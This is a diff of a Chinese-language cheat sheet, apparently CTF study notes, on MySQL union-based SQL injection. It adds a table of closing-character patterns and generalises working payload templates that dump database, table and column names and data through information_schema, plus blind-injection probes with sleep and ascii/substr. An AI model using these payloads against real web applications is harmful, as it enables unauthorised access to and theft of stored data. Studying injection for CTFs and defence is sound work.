@@ -99,31 +99,54 @@ MySQL 自带的元数据库，记录所有库、表、列的信息。注入时�
 | `'` `"` | 字符串 / 闭合 | 报错时先想是不是引号没闭合 |
 | `)` | 闭合括号 | 输入被包在 `((((((` 里时，先补 6 个 `)` |
 
-## 四、四步取数模板
+## 四、先确定闭合符
+
+**闭合符不是固定语法**，取决于你的输入被源码里的什么包住。`id=0))))))` 只适用于"6 层括号包裹"这一种情况，换成别的题目就报错。
+
+| 源码里的拼接 | 输入被包在什么里 | payload 开头 |
+|---|---|---|
+| `WHERE id = ` . $_GET['id'] | 数字，无包裹 | `id=0 union select 1,2 --+` |
+| `WHERE id = '` . $_GET['id'] . `'` | 单引号 | `id=0' union select 1,2 --+` |
+| `WHERE id = ('` . $_GET['id'] . `')` | 单引号 + 一层括号 | `id=0') union select 1,2 --+` |
+| `WHERE id = (((((( ` . $_GET['id'] . ` ))))))` | 6 层括号 | `id=0)))))) union select 1,2 --+` |
+| `WHERE name LIKE '%` . $_GET['n'] . `%'` | 单引号 + 百分号 | `id=0%' union select 1,2 --+` |
+
+**怎么确定**：
+
+1. 能看到源码 → 直接数括号、看引号
+2. 看不到源码 → 试错：先传 `1'`，报错说明被引号包着；再补 `)` 直到语法错误消失
+3. 闭合之后，**一定要用 `--+` 把模板残余的引号/括号注释掉**，否则会多出未匹配的符号
+
+## 五、四步取数模板
+
+把 `[闭合]` 换成上一步确定的符号（没有包裹就留空）。
 
 ```sql
 -- 1) 爆库
-id=0)))))) union select 1,group_concat(schema_name) from information_schema.schemata --+
+id=0[闭合] union select 1,group_concat(schema_name) from information_schema.schemata --+
 
 -- 2) 爆表
-id=0)))))) union select 1,group_concat(table_name) from information_schema.tables where table_schema='库名' --+
+id=0[闭合] union select 1,group_concat(table_name) from information_schema.tables where table_schema='库名' --+
 
 -- 3) 爆列
-id=0)))))) union select 1,group_concat(column_name) from information_schema.columns where table_schema='库名' and table_name='表名' --+
+id=0[闭合] union select 1,group_concat(column_name) from information_schema.columns where table_schema='库名' and table_name='表名' --+
 
 -- 4) 取数据
-id=0)))))) union select 1,group_concat(列名) from 库名.表名 --+
+id=0[闭合] union select 1,group_concat(列名) from 库名.表名 --+
 ```
+
+> 本文示例题目里，`[闭合]` = `))))))`（6 个右括号）。
 
 一步全打（小库适用）：
 
 ```sql
-id=0)))))) union select 1,group_concat(table_schema,0x2e,table_name,0x3a,column_name) from information_schema.columns where table_schema='库名' --+
+id=0[闭合] union select 1,group_concat(table_schema,0x2e,table_name,0x3a,column_name) from information_schema.columns where table_schema='库名' --+
 ```
+
 
 `0x2e` = `.`，`0x3a` = `:`，用来给输出加分隔，方便看。
 
-## 五、排错清单
+## 六、排错清单
 
 | 现象 | 原因 | 处理 |
 |---|---|---|
@@ -136,11 +159,12 @@ id=0)))))) union select 1,group_concat(table_schema,0x2e,table_name,0x3a,column_
 | 页面完全无回显 | 盲注场景 | 布尔盲注 `and ascii(substr(...))>100`，或时间盲注 `and sleep(3)` |
 | `load_file` 返回 NULL | 无 FILE 权限 / `secure_file_priv` 限制 | 换读表，或确认路径与权限 |
 
-## 六、随手记忆的口诀
+## 七、随手记忆的口诀
 
 - **库 → 表 → 列 → 数据**，一级一级往下问
 - **information_schema 是目录**：schemata(库) / tables(表) / columns(列)
 - **union 要列数对齐**，**group_concat 把多行变一行**
 - **不确定的字符串用 hex**，`0x637466` = `'ctf'`
 - **注释是 `-- `（带空格）**，URL 里写成 `--+`
+- **闭合符跟着包裹形态变**：无包裹 / `'` / `')` / `))))))` 各不相同，先确认再套模板
 - **先 `order by` 探列数，再 `union select 1,2,3` 探回显位**
